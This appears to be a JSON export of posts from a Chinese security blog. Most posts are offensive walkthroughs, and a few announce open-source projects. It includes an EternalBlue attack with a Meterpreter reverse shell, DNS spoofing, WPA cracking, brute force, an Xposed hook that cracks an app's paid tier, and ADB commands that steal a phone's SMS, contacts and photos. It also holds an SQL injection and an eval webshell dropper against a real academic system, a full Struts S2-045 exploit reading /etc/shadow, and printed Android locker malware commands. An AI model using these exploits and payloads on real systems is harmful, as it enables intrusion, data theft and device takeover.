[{"title":"世界末日:黑掉全世界的0day","date":"2017-04-15T12:41:27.000Z","path":"2017/04/15/世界末日-黑掉全世界的0day/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;今天凌晨网络上发生了一波核弹级爆炸，影子经纪人黑客组织(Shadow Brokers)又一次公布了方程式黑客组织（Equation Group）的武器库。方程式据称是美国安全局(NSA)下属的组织。 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;早在去年8月份，影子经纪人号称入侵了方程式并且窃取了大量的机密文件，并且公布了一部分机密文件以及0day，当时我也是刚刚找到工作，没怎么关注，当时也是看了一些文章，有一些cisco等路由器设备的0day，照成了后来的数已万计的路由器成肉鸡僵尸网络，ddos美国的域名商，致半个美国的网络瘫痪。&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ok不多说了，我们来看一下今天公布的0day吧。win10以下所有的windows通杀，而且还是远程溢出攻击直接拿shell，还有传说中的3389远程溢出，是不是在瑟瑟发抖了呢，想想早在高二的时候刚刚入门网络的时候自己还是一个只知道抓鸡的小门生，2003服务器居多，当时多想有一个3389的溢出，只要开了3389就可以直接拿下的，如今居然实现了。好了，下面一起来看看这个屌炸天的武器库吧。 ps:这个文章其实可以早一些时间发出来，我这个电脑12年入手的到现在已经跟随了我5年时间，开3个虚拟机太特么卡了，实验到一半就卡死重启，这让我换mbp的心更坚定了。 环境 python2.6.6/32位 pywin32-221.win32-py2.6 靶机 win7 攻击者1 攻击者1 配置下载解压后切换到windows目录执行python fb.py 输入靶机ip和攻击者ip以及选择是否开启本地监听。 创建一个工程项目，名字随意 选择模块，选择Eternalblue模块，输入use Eternalblue 一路回车选择默认的配置，然后到了这一步我们选择目标的系统，以及攻击方式 然后继续一路回车选择默认的配置，直到我们看到了这个 success 就说明成功了。 接下来继续选择攻击方式模块，选择Doublepulsar模块， 输入use Doublepulsar，继续一路回车，然后到这一步选择攻击的服务和目标系统的位数以及攻击方式 然后选择运行我们的payload文件，我们用msf来生成payload文件，在前面的安卓后门一章中也有讲过生成payload。 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.102 LPORT=5554 -f dll &gt; s.dll 如果电脑是32位的就去掉x64/，默认生成的就是32位的然后再启动配置msf，并监听反弹的shell。 msf &gt; use exploit/multi/handle msf exploit(handler) &gt; set PAYLOAD windows/meterpreter/reverse_Tcp msf exploit(handler) &gt; set LHOST 192.168.1.102 msf exploit(handler) &gt; set LPORT 5554 选择我们的payload之后继续一路回车，然后如果看到了success，就说明溢出成功了。 再来看看我们监听的反弹shell 成功反弹，喜大普奔。 总结 这只是NSA武器库的冰山一角，想想美国的网络安全真的是领先我们几个世纪啊，每年各种黑客国际大会比赛几乎都是中国人拿的冠军，原来是美国黑客压根就没参加。ps：这个武器库和msf很像，但是没有msf好用，默认选项太多，也许是msf用习惯了吧。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"内网王者之会话劫持","date":"2017-04-14T17:02:14.000Z","path":"2017/04/15/内网王者之会话劫持/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。 受害者 攻击者","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"内网王者之dns劫持","date":"2017-04-14T16:26:45.000Z","path":"2017/04/15/内网王者之dns劫持/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;同样不做多介绍，我们来使用ettercap这个老牌利器来完成这次实验。 受害者 攻击者 配置 首先我们需要更改ettercap的dns配置文件，位置在于/etc/ettercap/etter.dns, 我们直接shift+g来到配置文件的最后，配置劫持的域名，和域名所解析的ip，可用*通配符 我把所有.com和.cn的域名全部解析到了本地，也就是说访问.com和.cn的域名，会自动解析我的ip地址。 然后我们开启web服务器并且来到/var/www/html/路径，这里是默认weib服务器的网站目录，我们新建index.html内容随意。 攻击 配置完成之后我们就可以开始攻击了 ettercap -i eth0 -Tq -P dns_spoof /ip// /网关// -i 选择网卡 -T 文本模式 -P 选择模块 *后面的两组/，如果我选择内网里所有目标，可以不填ip， 可以看到检测到了3个目标， 我们来ping一下百度 可以看到百度的解析ip变成了我们的ip，说明我们已经劫持成功了，我们来访问一下百度 劫持成功，网页显示的是我们刚刚搭建web服务器中的内容，同时还会检测到访问的所有请求，全部都劫持解析到我们的ip中来。 也就是我们在配置文件上写的.com和.cn的域名全部会解析到我们的ip中来。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"wifi破解之WPA/WPA2抓包跑包","date":"2017-04-12T13:13:22.000Z","path":"2017/04/12/wifi破解之WPA-WPA2抓包跑包/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Aircrack-ng就不多介绍了，一个非常经典的破解套件,也有很多其他的一些软件，水滴，奶瓶等这些一键式破解的就不多说了，其实都是基于Aircrack-ng的 扫描ap 准备一个无限网卡，然后ifconfig可以看到网卡信息,如果看不到是因为无线网卡没启用就ifconfig -a查看全部无线网卡，可以ifconfig wlan0 up来启用。 然后扫描一下附近的ap。 airodump-ng wlan0wlan0是ifconfig的网卡名称，注意：我用的是kali2.0，其他版本的可能需要airmon-ng start wlan0把网卡置于监听模式 下面的STATION为连接AP的客户端，看BSSID来区分客户端属于哪个AP的注意：抓包必须要有客户端连接才可以抓包。 抓包 扫描到AP信息后来抓包 airodump-ng –bssid EC:88:8F:8A:9C:A0 -w mywifi -c 6 wlan0-bssid 要抓的ap的mac-w 保存的包名-c 信道(就是扫描中的CH)注意：抓包中需要攻击ap，让客户端断线，重新连接ap后才可以抓到包。可以用aireplay-ng组件来攻击ap aireplay-ng -0 0 -a EC:88:8F:8A:9C:A0 wlan0-0 冲突攻击模式-a ap的mac 抓到包后右上角会显示抓到包的客户端mac 跑包 aircrack-ng -w [字典] [抓到的cap包]","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"burp爆破http Basic认证","date":"2017-04-04T11:38:29.000Z","path":"2017/04/04/burp爆破http-Basic认证/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;闲来没事想来看看路由器，对于如何配置burp就不多说了。不用验证码，很好。 然后我们来登录看看发的哪些请求 看样子密码经过base64加密了 可以看到帐号默认admin，然后后面就是我们输入的密码 于是我输入另一个密码，来看一下编码中密码是从哪儿开始的知道了编码中那些是密码，然后我们回到burp中，把请求发送到intruder,来配置字典playload 首先load进字典文件然后到下面的playload Processing,选择add 我们需要的处理是把字典中的密码来编码成base64的，于是选择encode选择什么样的编码呢？我们选择base64, 当然这里也有其他的编码，urlencode等。然后start attack，走你可以看到密码已经全部经过base64加密了。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"开发xposed破解模块","date":"2017-03-28T09:13:30.000Z","path":"2017/03/28/开发xposed破解模块/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现了一个挺好玩的app，百变语音，就是在qq上可以把自定义的mp3以语音形式发送给好友。app上有很多男女说话的语音供用户下载使用，同时也可以把qq里面别人发的语音下载过来自己用。(当你听到一个甜美的美女声音的时候，背后可能是一个基佬。)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其中还有会员功能，会员功能有更多的语音，并且同时可以在微信中使用。ok让我们来分析一下吧。 反编译 首先来反编译走一波。前面的文章有说道如何反编译，这里就不多说了。 一个小小的app还有这么多包。翻AndroidManifest找入口的Activity 可以看到，指定了一个路径然后给了a.b，然后获取了包名给了a.g，然后有创建了一个HashMap给q.c，然后然后。。。。(我实在编不下去了。)这特么是些啥玩意儿，然后我不看这些杂乱无章的代码，找一下关于会员的关键代码，依然找不到任何线索。这时候突然看到了一个很奇怪的包名 进去看依然是被混淆得不成样子的代码。不过为什么要叫iapp呢，于是我百度了一番。 （这是一款神奇的软件，iApp是一款让你的手机展现放光彩的应用。轻松的操作就可以设计出，你想要的应用界面，你可以分享给你的朋友，传递你的快乐！iApp采用了可视化设计界面，让你设计界面的时候一目了然，不用繁琐的看着代码伤脑筋了！iApp不是一款简单的应用程序，它是创造应用的应用程序。 如果你没有iApp 你就真的没有iApp！ )嗯，非常好，前者有e4a，现在又出来个iapp。全都是直接拖组件的，怪不得这么多包名。 于是不看代码了，看看app的网络请求。 全都是一些注释信息和语音名单。同时把手机的IMEI码上传到了服务器。 其中的vip.php引起了我的注意。返回 0 于是我把这个请求使用burp重定向到了本地，返回 1，这个时候奇迹出现了，Duang 直接就成会员了。 末尾 这个app原理其实很简单，利用了qq的校验不严的漏洞。在录语音的时候会在本地生成已一个语音文件，然后发送给好友就是把这个语音文件发送了出去。然而发送的时候这个语音文件和录语音时生成的语音文件并没有做校验，导致了可以任意发送语音文件。 编写Hook模块。 两种方法。1,把请求重定向自己的页面，返回12,把请求的响应体强制改成1 12345678910111213141516findAndHookMethod(AbstractHttpClient, \"execute\", HttpUriRequest, new XC_MethodHook() &#123; @Override protected void beforeHookedMethod(MethodHookParam param) throws URISyntaxException, UnknownHostException &#123; if (HttpRequestBase.isInstance(param.args[0])) &#123; Object httpRequestBase = param.args[0]; URI uri = (URI) callMethod(httpRequestBase, \"getURI\"); String host = uri.getHost(); if (\"****.**/vip/vip.php?imei=\".equals(host)) &#123; String ip = \"http:oi8g0l23v.bkt.clouddn.com/vip.txt\"; URI newUrl = new URI(uri.getScheme(), uri.getUserInfo(), ip, uri.getPort(), uri.getRawPath(), uri.getRawQuery(), uri.getRawFragment()); callMethod(httpRequestBase, \"setURI\", newUrl); callMethod(httpRequestBase, \"setHeader\", \"Host\", host); &#125; &#125; &#125;&#125;); app和模块下载地址 http://pan.baidu.com/s/1skFxIuL 密码: 8zyj","tags":[{"name":"xposed","slug":"xposed","permalink":"http://y00z.github.io/tags/xposed/"},{"name":"破解","slug":"破解","permalink":"http://y00z.github.io/tags/破解/"}]},{"title":"xposed环境搭建","date":"2017-03-25T10:55:37.000Z","path":"2017/03/25/xposed环境搭建/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Xposed是GitHUB上rovo89大神设计开发的一个针对Android平台的动态劫持项目，通过替换/system/bin/app_process程序控制zygote进程，使得app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持。Xposed在开机的时候完成对所有的Hook Function的劫持，在原Function执行的前后加上自定义代码。 正文 安卓环境就不多说了。 1 创建一个安卓工程项目初识状态 2 导入xposed的jar包下载地址： https://bintray.com/rovo89/de.robv.android.xposed/api下载里面的api-82-sources.jar和api-82.jar导入到项目的lib目录下 3 修改AndroidManifest.xml在application节点中加入代码 123456789&lt;meta-data android:name=\"xposedmodule\" android:value=\"true\" /&gt; &lt;meta-data android:name=\"xposeddescription\" android:value=\"Hook log test\" /&gt; &lt;meta-data android:name=\"xposedminversion\" android:value=\"53\" /&gt; 4 修改build.gradleprovided 方式导入jar包123456dependencies &#123; compile 'com.android.support:appcompat-v7:25.2.0' testCompile 'junit:junit:4.12' provided 'de.robv.android.xposed:api:82' provided 'de.robv.android.xposed:api:82:sources'&#125; 注意,注意,注意,注意,注意,注意这里默认有个 compile fileTree(dir: &#39;libs&#39;, include: [&#39;*.jar&#39;]) 一定要删掉。 5 创建一个类创建一个Tutorial类，继承IXposedHookLoadPackage 12345public class Tutorial implements IXposedHookLoadPackage &#123; public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable &#123; XposedBridge.log(\"正在加载中.....\" + lpparam.packageName); &#125;&#125; 6 创建入口文件。创建一个assets文件，并且在里面创建一个xposed_init文件。xposed_init里面内容为Tutorial的完全路径hk.myapplication03.Tutorial //完整类名:包名+类名 Ok，全部已经搭建好了，来运行一下，需要进到框架中激活并且重启才能生效。查看一下log日志。 OK了， 环境搭建完成并且成功的实现了一个简单的HOOK","tags":[{"name":"xposed","slug":"xposed","permalink":"http://y00z.github.io/tags/xposed/"}]},{"title":"adb指令渗透手机获取隐私信息","date":"2017-03-17T03:00:20.000Z","path":"2017/03/17/adb指令渗透手机获取隐私信息/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 前天的315晚会上，其中有部分为“手机充电桩窃取使用者信息”，其实攻击的原理并不高端，无非就是执行了adb恶意指令。前提就是必须开了usb调试模式，一旦开启并允许adb调试的话，就等同于让你的手机权限拱手让人了。 发送短信 控制受害者手机发送短信，这个只需要三条命令就可以达到。 打开了短信应用程序，当前焦点在文本框 adb shell am start -a android.intent.action.SENDTO -d sms:10086 –es sms_body “hello” –ez exit_on_sent true焦点去到发送按键 adb shell input keyevent 22回车，就是按下发送键 adb shell input keyevent 66 监视受害者手机 对受害者手机屏幕录屏，然后从手机传输到电脑。 adb shell screenrecord /sdcard/test.mp4录制完毕后再从手机传输到电脑中 adb pull /sdcard/test.mp4 d:\\test.mp4其中如果全分辨率录制的会视频会比较大，如果受害者手机是2k的，那么就更大了，所以建议设置一下分辨率。 adb shell screenrecord –size 848x480 /sdcard/test.mp4 静默安装程序 将恶意程序静默安装在受害者手机内。 adb install d:/test.apk打开启动程序 adb shell am start -n hk.myapplication/hk.myapplication.MainActivityhk.myapplication为包名，hk.myapplication.MainActivity为Activity的路径. 窃取通讯录短信等隐私。 作为安卓开发者我们都知道手机的短信通讯录等都存在手机的数据库中。我们把数据库拷贝到电脑就相当于获取到了受害者的通讯录短信。通讯录和通话记录的数据库存放在/data/data/com.android.providers.contacts/databases/contacts2.db短信的数据库存放在/data/data/com.android.providers.telephony/databases/mmssms.dbps: 不知道是我手机原因还是什么原因，adb pull 不能直接拷贝到电脑，然后adb shell进入命令模式，先把数据库拷贝到sdcard中，然后再adb pull就成功拷贝了。另外所有安卓手机中，我们手机拍摄的照片都会保存在/sdcard/DCIM这个文件夹中，我们adb pull这个文件夹，受害者在生活照所拍摄的照片和视频全部都可以获取到。 末尾 这些危害都是在受害者连接usb后触发的，而且攻击过程受害者是完全感觉不到的。希望大家务必做好防范措施 不要使用安全性未知的数据线连接自己的手机。 在非需要调试的情况下，不要开启adb调试。 安装可靠的手机杀毒软件。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"}]},{"title":"某教务系统注入getshell提权一条龙(下)","date":"2017-03-14T03:14:42.000Z","path":"2017/03/14/某教务系统注入getshell提权一条龙-下/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;上篇说道注入到管理员登录密码登录，下面讲介绍如何拿shell提权。 漏洞详情 登录教务系统后，在信息公告栏里面有个教务公告发布，这里可以上传 这里对ashx文件没有过滤，所以可以上传一个ashx马来生成aspx一句话 poc:12345678910111213141516171819&lt;%@ WebHandler Language=&quot;C#&quot; Class=&quot;Handler&quot; %&gt; using System; using System.Web; using System.IO; public class Handler : IHttpHandler &#123; public void ProcessRequest (HttpContext context) &#123; context.Response.ContentType = &quot;text/plain&quot;; string show=&quot;&lt;%@ Page Language=\\&quot;Jscript\\&quot;%&gt;&lt;%eval(Request.Item[\\&quot;chopper\\&quot;],\\&quot;unsafe\\&quot;);%&gt;&quot;; StreamWriter file1= File.CreateText(context.Server.MapPath(&quot;root.aspx&quot;)); file1.Write(show); file1.Flush(); file1.Close(); &#125; public bool IsReusable &#123; get &#123; return false; &#125; &#125; &#125; 会上传在wbwj目录下 访问http://***.***.com/wbwj/***.ashx，会在同目录生成一个root.aspx一句话，密码 chopper 一句话地址，http://***.***.com/wbwj/root.aspx 连接之 看下权限,还是挺大的， 直接上传神器提权之。 3389端口没有改，直接连接。 在里面翻了半天都没找到数据库，然后看了下端口，本机的1521端口根本没开，而本机和内网另一台机器的1521端口连接着，看来是站库分离了。 结尾 这个是什么教务系统就不多说，用过的一看就知道。有很多高校大学用的这个教务系统，早在去年一晚的时间就发现了50多个高校都存在漏洞，不过都上报给了乌云。后期还会写更多的渗透文章，漫游学校内网，更改led大屏幕，免费上网等。再次提醒：文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"某教务系统注入getshell提权一条龙(上)","date":"2017-03-14T03:14:26.000Z","path":"2017/03/14/某教务系统注入getshell提权一条龙-上/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这篇文章是我在去年的时候在土司和90上写的一篇文章，当时也将漏洞详细上报给乌云了。今时不同往日，如今乌云关了，土司也太久没登成了僵尸号。于是把文章搬过来，凑下文章篇数。 漏洞详情 今天的目标 找到webservice接口，路径在service.asmx 漏洞在于 GetStuCheckinInfo这个接口 我们只需要关注xh和 strKey 这两个节点就可以了。 其中的strKey都是默认的KKKGZ2312 Xh这个节点就是我们的注入语句了。 poc:123222222' union select Null,kl,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null,Null from yhb where yhm='jwc01 yhb 用户表yhm 用户名kl 口令 表示查询的是yhm表中jwc01的kl记录。(该教务系统默认管理员是jwc01) 构造好语句开始注入 可以看到jwc01用户的密码密文出来了。 我们拿去解密 Ok可以登录了 Bingo 美女多多， 结尾 不想让文章太长，getshell提权部分就放在下篇。后期还会写更多的渗透文章，漫游学校内网，更改led大屏幕，免费上网等。再次提醒：文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"s2-045任意命令执行exp","date":"2017-03-07T08:19:32.000Z","path":"2017/03/07/s2-045任意命令执行exp/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！ 正文 今天早上一醒就被s2漏洞给刷屏了,心想一下这不是几年前的漏洞吗，怎么又火起来了 详细了解之后才知道今天凌晨的时候又爆了一个任意命令执行漏洞，由安恒WEBIN实验室发现. 涉及Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10多个版本。 可将版本更新至Struts 2.3.32 或者 Struts 2.5.10.1 或 使用第三方的防护设备进行防护。 目前官方已确认(漏洞编号S2-045) poc 1234567891011121314151617#! /usr/bin/env python# encoding:utf-8import urllib2import sysfrom poster.encode import multipart_encodefrom poster.streaminghttp import register_openers def poc(): register_openers() datagen, header = multipart_encode(&#123;\"image1\": open(\"tmp.txt\", \"rb\")&#125;) header[\"User-Agent\"]=\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36\" header[\"Content-Type\"]=\"%&#123;(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='cat /etc/shadow').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?&#123;'cmd.exe','/c',#cmd&#125;:&#123;'/bin/bash','-c',#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())&#125;\" request = urllib2.Request(str(sys.argv[1]),datagen,headers=header) response = urllib2.urlopen(request) print response.read() poc() 末尾希望这次各个厂商能及时防范，不要想前几年一样造成大量的数据泄漏(某东12G)","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"}]},{"title":"React-Native电商项目源码","date":"2017-02-23T05:57:29.000Z","path":"2017/02/23/React-Native电商项目源码/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;对于react-native就不多介绍了，这个项目去年的时候就开始写了，中间因为公司的一些项目原因耽搁了一段时间，所以一直到现在才发出来.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这个项目比较简单，主要是布局方面，代码简洁明了，适合初识react-native的同学了解和学习&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;由于没有ios设备，所以没有对ios设备做适配，另外感谢小马哥提供的学习资料素材。 接口 接口方面全部用的本地json文件。 库 react-native-tab-navigator 运行 npm install react-native run-android 演示 项目地址 https://github.com/Y00z/react-navie_store","tags":[{"name":"React-Native","slug":"React-Native","permalink":"http://y00z.github.io/tags/React-Native/"},{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"}]},{"title":"微信小程序app源码","date":"2017-02-06T02:16:04.000Z","path":"2017/02/06/微信小程序app源码/","text":"前言 小程序已经出来一段时间了，对于小程序就不做多评价了，网上很多介绍文章。我们公司的这个小程序项目是一个演示项目，介绍公司产品的主要功能，代码很简单。微信小程序本身就很简单，和react-native很多相似处。为防止数据泄漏，我就把接口换成了死数据。使用到了下拉刷新，上拉加载更多，wx-charts框架等 登录 主页 图表 菜单 列表 详情 源码 https://github.com/Y00z/wx_acm","tags":[{"name":"开源","slug":"开源","permalink":"http://y00z.github.io/tags/开源/"},{"name":"小程序","slug":"小程序","permalink":"http://y00z.github.io/tags/小程序/"}]},{"title":"drozer对app安全测试","date":"2017-02-04T03:44:08.000Z","path":"2017/02/04/drozer对app安全测试/","text":"前言 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;最近发现一款不错的Android安全测试框架&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;其官方文档说道：“Drozer允许你一一个普通android应用的身份与其他应用和操作系统交互。”&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在Web世界已经有了许多安全测试工具了，我们只需要给出一个目标，这些工具就会自动为我们安全测试报告。但Drozer与这样的自动化扫描器不同，Drozer是一种交互式的安全测试工具。使用Drozer进行安全测试，用户在自己的工作站上输入命令，Drozer会将命令发送到Android设备上的代理程序执行。 配置环境 电脑和手机都需要安装drozer下载地址https://www.mwrinfosecurity.com/products/drozer/community-edition/我电脑是windows的，安装完毕后，dos切换到drozer安装目录。 连接手机 然后手机上安装好drozer并且开启server默认端口31415 然后手机打开调试usb连接电脑，输入指令做端口转发 adb forward tcp:31415 tcp:31415必须在adb devices 有显示手机设备才可以。dos中，在drozer安装目录输入指令drozer console connect连接成功了。 功能介绍所有的模块 list查看框架所有的模块 run app.package.list列出手机上所有应用包名 查看包名 run app.package.listps: 为了一些有心人士,所以打了码,不好意思。加上-f参数，搜索特定包名支持模糊搜索： run app.package.list -f (string to be searched) 查看包详情 run app.package.info –a (package name) 扫描攻击面 扫描指定app的攻击面。 run app.package.attacksurface (package name)可以看到有3个暴露的activity，现在我们需要找出暴露activity的名字并检查是否有敏感信息 查看暴露的页面 run app.activity.info –a (package name)如果暴露的页面是需要登录之后获取一些操作之后才能看到的页面。那么用drozer绕过登录认证，直接打开这个页面。 打开暴露的页面 run app.activity.start –component (package name) (activity name)会直接启动该activity。就这样我们成功绕过了登录认证。由于我在页面写了检测到如果没有登录，就重新跳到登录页面，所以有弹出框。 漏洞原因 在AndroidManifest.xml中activity有一个属性android:exported，当这个属性为true的时候，表示该组件可以被其他组件调用。所以直接不写这个属性就可以了，默认false。ps:其实这个app本来是没这个属性，我为了方便演示才加上的。","tags":[{"name":"安全攻防","slug":"安全攻防","permalink":"http://y00z.github.io/tags/安全攻防/"},{"name":"安卓","slug":"安卓","permalink":"http://y00z.github.io/tags/安卓/"}]},{"title":"对安卓锁机恶意程序反编译分析","date":"2017-01-08T06:08:50.000Z","path":"2017/01/08/对安卓锁机恶意程序反编译分析/","text":"前言 这个逆向分析呢，是半年前的，现在有博客了我就觉得把技术细节分享出来。当时的安卓锁机恶意程序有些泛滥，当时也正好得到一个样本就逆向分析了一下。 正文 锁机恶意程序一共分为两种：1、通过设备管理器锁机加密码2、设置一个view至栈顶端。 第一种 在上一篇博文中的安全卫士中有用到这个设备管理器。原理和我项目中的是一样的。先自动跳转到激活设备管理器页面，用户点击激活后设置密码，安全卫士项目中有代码，这里就不多说了。 第二种 这种也就是这篇博文主要讲的了。ApkTool用来逆向反编译。主要文件，混淆了方法名和类名。重要的是ijm-x86.so这个so文件,后面有讲解先从AndroidManifest来找到入口的Activity，c.class，然后来看看初始化的主要代码123456789101112131415161718192021@Overrideprotected void onCreate(Bundle paramBundle)&#123; LogCatBroadcaster.start(this); super.onCreate(paramBundle); setContentView(2130903040); this.b = ((Button)findViewById(2131099651)); this.t = ((EditText)findViewById(0)); Button localButton = this.b; ButtonClickListener localButtonClickListener = new ButtonClickListener(); localButton.setOnClickListener(localButtonClickListener); try &#123; StringBuffer localStringBuffer = new StringBuffer(); d(this.path + \"/zihao.l\"); return; &#125; catch (IOException localIOException) &#123; &#125;&#125; this.path是当前内存卡的路径,也就是内存卡路径然后拼接zihao.l这个字符串，传给了d方法，并且模拟点击了ButtonClickListener，我们先来看看d方法。 123456789101112131415161718private void d(String paramString) throws IOException&#123; FileOutputStream localFileOutputStream = new FileOutputStream(paramString); InputStream localInputStream = getAssets().open(\"ijm-x86.so\"); byte[] arrayOfByte = new byte[1024]; for (int i = localInputStream.read(arrayOfByte); ; i = localInputStream.read(arrayOfByte)) &#123; if (i &lt;= 0) &#123; localFileOutputStream.flush(); localInputStream.close(); localFileOutputStream.close(); return; &#125; localFileOutputStream.write(arrayOfByte, 0, i); &#125;&#125; 把ijm-x86.so文件复制到了sd卡中，并且命名为zihao.l再来看看ButtonClickListener的点击事件。123456789101112131415 private final class ButtonClickListener implements View.OnClickListener&#123; public ButtonClickListener() &#123; &#125; @Override public void onClick(View paramView) &#123; b localb = new b(); localb.rootShell(); a.deleteFile(c.this.file); &#125;&#125; 执行了b对象中的rootShell方法。我们继续跟进。1234void rootShell()&#123; execCommand(new String[] &#123; \"mount -o rw,remount /system\", \"mount -o rw,remount /system/app\", \"cp /sdcard/zihao.l /system/app/\", \"chmod 777 /system/app/zihao.l\", \"mv /system/app/zihao.l /system/app/zihao.apk\", \"chmod 644 /system/app/zihao.apk\", \"reboot\" &#125;, true);&#125; 很明显，这个是执行shell命令的代码。先把/system 和 /system/app 设置可读可写。再从sd卡把zihao.l复制到/system/app中，并且命名zihao.apk。最后再重启。/system/app是存放系统app的，这个操作呢，是把zihao.apk设置成系统app，并且不可卸载。这个zihao.apk也就是上面的ijm-x86.so，这个so文件其实一个apk程序，我们再来逆向分析一下这个ijm-x86.so。 ###分析第二层 同样的手法，找到app的入口Activity. 1234567@Overridepublic void onCreate(Bundle paramBundle)&#123; LogCatBroadcaster.start(this); super.onCreate(paramBundle); activiteDevice();&#125; 继续跟进 123456789101112131415161718private void activiteDevice()&#123; Intent localIntent = new Intent(\"android.app.action.ADD_DEVICE_ADMIN\"); NoClassDefFoundError localNoClassDefFoundError; try &#123; Class localClass = Class.forName(\"com.h.MyAdmin\"); ComponentName localComponentName = new ComponentName(this, localClass); localIntent.putExtra(\"android.app.extra.DEVICE_ADMIN\", localComponentName); startActivityForResult(localIntent, 0); return; &#125; catch (ClassNotFoundException localClassNotFoundException) &#123; localNoClassDefFoundError = new NoClassDefFoundError(localClassNotFoundException.getMessage()); &#125; throw localNoClassDefFoundError;&#125; 操作打开激活设备管理器的界面 来看看MyAdmin里面的代码。 123456789101112131415161718192021@Override public void onEnabled(Context paramContext, Intent paramIntent) &#123; String str = Integer.toString(1997); NoClassDefFoundError localNoClassDefFoundError; try &#123; Class localClass = Class.forName(\"com.h.s\"); Intent localIntent = new Intent(paramContext, localClass); localIntent.setFlags(268435456); 